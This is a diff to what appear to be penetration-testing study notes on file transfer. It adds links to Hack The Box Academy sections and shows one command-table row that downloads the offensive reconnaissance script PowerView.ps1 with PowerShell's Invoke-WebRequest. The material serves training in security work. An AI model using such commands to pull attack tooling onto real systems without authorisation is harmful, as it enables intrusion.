@@ -1,3 +1,10 @@
+# File Transfer  
+
++ [Windows File Transfer Methods](https://academy.hackthebox.com/module/24/section/160)
++ [Linux File Transfer Methods](https://academy.hackthebox.com/module/24/section/514)
++ [Transfering Files with Code](https://academy.hackthebox.com/module/24/section/1574)
++ [Netcat / PowerShell](https://academy.hackthebox.com/module/24/section/161)
+
 | **Command** | **Description** |
 | --------------|-------------------|
 | `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
